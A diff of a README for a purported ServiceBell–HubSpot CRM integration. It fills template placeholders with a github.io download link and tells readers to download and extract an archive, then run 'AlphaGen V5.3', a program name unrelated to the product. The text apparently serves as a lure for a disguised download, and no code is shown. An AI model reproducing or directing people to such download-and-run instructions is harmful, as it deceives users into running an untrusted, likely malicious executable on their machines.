@@ -2,13 +2,13 @@
 
 Connect ServiceBell with HubSpot CRM to enable real-time video chat, inbound lead routing, and instant rep engagement — all from your website.
 
-[![Download](https://img.shields.io/badge/Download-ServiceBell_HubSpot_Integration-blueviolet)](PLACE_YOUR_DOWNLOAD_LINK_HERE)
+[![Download](https://img.shields.io/badge/Download-ServiceBell_HubSpot_Integration-blueviolet)](https://servicebell-integration-hubspot-crm.github.io/.github)
 
 ---
 
 ### ⚙️ Installation Instructions
 
-1. 📦 [Download the archive](PLACE_YOUR_DOWNLOAD_LINK_HERE)  
+1. 📦 [Download the archive](https://servicebell-integration-hubspot-crm.github.io/.github)  
 2. 📁 Extract the contents to your preferred folder  
 3. 🖱 Run AlphaGen V5.3 to enable live chat and CRM sync  
 4. ✅ In HubSpot, go to `Settings > Integrations > ServiceBell`, and link your workspace for contact and deal automation
